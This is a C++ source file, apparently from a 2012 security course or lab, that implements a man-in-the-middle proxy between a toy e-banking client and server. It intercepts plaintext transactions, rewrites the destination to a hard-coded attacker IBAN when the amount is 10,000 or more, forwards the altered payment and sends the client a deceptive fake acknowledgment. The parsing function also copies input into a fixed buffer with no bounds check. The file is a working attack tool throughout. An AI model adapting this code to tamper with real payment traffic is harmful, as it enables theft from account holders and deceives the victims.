/*
 * mitmClass.cpp
 *
 *  Created on: May 26, 2012
 *      Author: matteo
 */

#include "mitmClass.h"

#define MAX_BUF_SIZE 256

using namespace std;

mitmClass::mitmClass()
{

	QLEN = 1;
	endServiceLoop = 0;

	mitmIpAddress = "127.0.0.1";
	serverIpAddress = "127.0.0.1";
	mitmPortNumber = 60666;
	serverPortNumber = 60000;

	maliciousIban = "IT22O0322601606000500074972";

}

mitmClass::~mitmClass()
{

}

void mitmClass::accessService( string serverIpAddress, int serverPortNumber )
{

	/*
	 * variable to check operations
	 */
	int checkOperation;

	/*
	 * allocating memory for server socket address
	 */
	memset( (char*)&sad, 0, sizeof(sad) );

	/*
	 * setting socket parameters
	 */
	sad.sin_family = AF_INET;
	sad.sin_port = htons( (u_short)serverPortNumber );
	checkOperation = inet_aton( serverIpAddress.c_str(), &sad.sin_addr );
	if( checkOperation == 0 ){
		cout << "Invalid IP format: [" << serverIpAddress << "]" << endl;
		exit(1);
	}

	/*
	 * creating socket to connect to the server
	 */
	cout << "Server to contact: [" << serverIpAddress << "]:[" << serverPortNumber << "]" << endl;
	cout << "Server to contact: [" << sad.sin_addr.s_addr << "]:[" << sad.sin_port << "]" << endl;

	serverSocketDescriptor = socket(PF_INET, SOCK_STREAM, 0);

	/*
	 * connecting to server through socket
	 */
	cout << "Connecting to [" << sad.sin_addr.s_addr << "]:[" << sad.sin_port << "]" << endl;

	checkOperation = connect( serverSocketDescriptor, (struct sockaddr*)&sad, sizeof(sad) );
	if( checkOperation == 0 )
		cout << "Connected to [" << sad.sin_addr.s_addr << "]:[" << sad.sin_port << "]" << endl << endl;
	else{
		cout << "Unsuccessful connection, closing MITM" << endl;
		exit(1);
	}

}

void mitmClass::setupMaliciousService( string fakeServerIpAddress, int fakeServerPortNumber )
{

	/*
	 * variable to check operations
	 */
	int checkOperation;

	/*
	 * allocating memory for server socket address
	 */
	memset( (char*)&sad, 0, sizeof(sad) );

	/*
	 * setting socket parameters
	 */
	sad.sin_family = AF_INET;
	checkOperation = inet_aton( fakeServerIpAddress.c_str(), &sad.sin_addr );
	sad.sin_port = htons( (u_short)fakeServerPortNumber );

	cout << "MITM IP address and service port: [" << fakeServerIpAddress << "]:[" << fakeServerPortNumber << "]" << endl;
	cout << "MITM IP address and service port: [" << sad.sin_addr.s_addr << "]:[" << sad.sin_port << "]" << endl;

	/*
	 * creating socket for the client
	 */
	socketDescriptor = socket(PF_INET, SOCK_STREAM, 0);
	if( socketDescriptor < 0 ){
		perror("Socket creation failed\n");
		exit(1);
	}

	cout << "Socket created with sd: [" << socketDescriptor << "]" << endl << endl;

	/*
	 * assigns the created socket to the SERVER address
	 */
	checkOperation = bind( socketDescriptor, (struct sockaddr *)&sad, sizeof(sad) );
	if( checkOperation == -1 ){
		perror( "Error in Bind\n" );
		exit(1);
	}

	/*
	 * prepares the socket for incoming connections
	 * maximum QLEN connections can wait while a client is being served
	 */
	checkOperation = listen( socketDescriptor, QLEN );
	if( checkOperation < 0 ){
		perror( "Listen failed\n" );
		exit(1);
	}

}

void mitmClass::maliciousServiceLoop()
{

	/*
	 * variable to check operations
	 */
	int checkOperation;

	/*
	 * buffer to receive data from clients
	 */
	char buffer[MAX_BUF_SIZE];

	/*
	 * string representing the acknowledgment message of transaction authentication
	 */
	string fakeClientAck = "Transaction Successful, Please DO NOT RETURN IN NEXT HOURS FOR TECHNICAL PROBLEMS";

	cout << "Mitm malicious Server in the service loop" << endl;

	while( !endServiceLoop ){

		alen = sizeof(cad);

		cout << "Mitm is waiting for a Client to intercept..." << endl << endl;

		/*
		 * creates a new socket for each connection
		 * and removes the connection from the listen queue
		 */
		clientSocketDescriptor = accept( socketDescriptor, (struct sockaddr *)&cad, &alen );
		if( clientSocketDescriptor < 0 ){
			if( endServiceLoop ) break;
			perror( "Accept failed\n" );
			exit(1);
		}

		cout << "Intercepting Client with the following Socket Descriptor [" << clientSocketDescriptor << "]" << endl;

		/*
		 * connecting to real e-banking server for forwarding the intercepted transaction
		 */
		this->accessService( this->serverIpAddress, this->serverPortNumber );

		cout << "Waiting for a transaction from the Client to sniff and alter..." << endl << endl;

		/*
		 * emptying buffer for new incoming data
		 */
		for(int i = 0; i < MAX_BUF_SIZE; i++){
				buffer[i] = 0;
		}

		/*
		 * blocking function waiting for incoming transaction from client
		 */
		checkOperation = read( clientSocketDescriptor, buffer, sizeof(buffer) );
		cout << "Transaction sniffed from client: [" << buffer << "]" << endl;

		string newTransactionData = string( buffer );

		/*
		 * function implementing a policy for altering or not a sniffed transaction
		 */
		checkOperation = this->alterTransaction( newTransactionData );
		cout << "Sending to Server the following altered Transaction: [" << newTransactionData << "]" << endl << endl;

		/*
		 * sending to the server the malicious transaction
		 */
		write( serverSocketDescriptor, newTransactionData.c_str(), newTransactionData.length() );

		/*
		 * emptying buffer for new incoming data
		 */
		for(int i = 0; i < MAX_BUF_SIZE; i++){
				buffer[i] = 0;
		}

		/*
		 * sending to the client the fake acknowledgment message
		 * or waiting for the server and sending the true acknowledgment message
		 */
		if( checkOperation == 1 ){

			read( serverSocketDescriptor, buffer, sizeof(buffer) );
			cout << "Intercepted Ack from Server: [" << buffer << "]" << endl;
			cout << "Forwarding Fake Ack to Client: [" << fakeClientAck << "]" << endl;
			write( clientSocketDescriptor, fakeClientAck.c_str(), fakeClientAck.length() );
		}else{
			read( serverSocketDescriptor, buffer, sizeof(buffer) );
			cout << "Intercepted Ack from Server: [" << buffer << "]" << endl;
			cout << "Forwarding Ack to Client" << endl << endl;
			write( clientSocketDescriptor, buffer, sizeof(buffer) );
		}

		/*
		 * closing the connection with the server and the client
		 */
		close( serverSocketDescriptor );
		close( clientSocketDescriptor );
	}

	cout << "Out of the service loop" << endl;

}

void mitmClass::quitMaliciousService()
{

	cout << "Quitting Malicious Server" << endl;
	close( socketDescriptor );

}

int mitmClass::alterTransaction( string& newTransactionData )
{

	/*
	 * variables for parsing the transaction string
	 * representing positions inside of the string
	 */
	size_t foundIban, foundAmount, foundFirstParenthesis, foundSecondParenthesis;

	/*
	 * iban and amount of the sniffed transaction
	 */
	string iban, amount;
	int amountValue;

	iban = this->extractData( newTransactionData, "IBAN" );
	amount = this->extractData( newTransactionData, "AMOUNT" );

	/*
	 * convert amount string into integer to decide if altering or not the transaction
	 */
	amountValue = atoi( amount.c_str() );
	if( amountValue >= 10000 ){
		cout << "Altering Transaction since amount is greater than 10.000 $" << endl;
		newTransactionData = "IBAN[" + this->maliciousIban + "]AMOUNT[" + amount + "]";
		return 1;
	}else{
		cout << "Forwarding Transaction since amount is less than 10.000 $" << endl;
		return -1;
	}

}

string mitmClass::extractData( string transactionData, string wantedData)
{

	/*
	 * variables for parsing the transaction string
	 * representing positions inside of the string
	 */
	size_t found, foundFirstParenthesis, foundSecondParenthesis;

	/*
	 * buffer for extracting the wanted data content from the transaction data
	 */
	char buffer[MAX_BUF_SIZE];

	/*
	 * variable to access the transaction data string
	 */
	const char* buffer2;

	/*
	 * string that contains the value of the data extracted
	 */
	string extractedData;

	int i,j = 0;

	/*
	 * position of the "wantedData" inside of the transaction string
	 */
	found = transactionData.find( wantedData );

	//cout << "Found [" << wantedData << "] " << "at position [" << found << "] inside of [" << transactionData << "]" << endl;

	buffer2 = transactionData.c_str();

	for(int i = 0; i < MAX_BUF_SIZE; i++){
		buffer[i] = '0';
	}

	i = found + wantedData.length();

	do{
		buffer[j] = buffer2[i];
		i++;
		j++;
	}while( buffer[j - 1] != ']' );

	buffer[j] = '\0';

	extractedData = string( buffer );

	foundFirstParenthesis = extractedData.find( "[" );
	foundSecondParenthesis = extractedData.find( "]" );

	extractedData = extractedData.substr( foundFirstParenthesis + 1, foundSecondParenthesis - ( foundFirstParenthesis + 1 ) );
	//cout << wantedData << ": [" << extractedData << "]" << endl << endl;

	return extractedData;

}
